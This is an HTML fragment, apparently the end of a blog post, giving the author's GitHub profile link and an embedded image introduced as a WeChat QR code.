<li class="graf graf--p">My GitHub: <a class="markup--anchor markup--p-anchor" href="https://github.com/OlivierLaflamme" target="_blank" rel="noopener nofollow noopener" data-href="https://github.com/OlivierLaflamme">https://github.com/OlivierLaflamme</a></li>
<li class="graf graf--p">My WeChat QR below:</li>
</ul><figure id="bkmrk--15" class="graf graf--figure graf--layoutOutsetLeft"><img class="graf-image" src="https://cdn-images-1.medium.com/max/750/0*Jh0zrZrfyn8WjkDn.png" data-image-id="0*Jh0zrZrfyn8WjkDn.png" data-width="142" data-height="144"></figure><p id="bkmrk-%C2%A0-6" class="graf graf--p graf--empty"> </p>
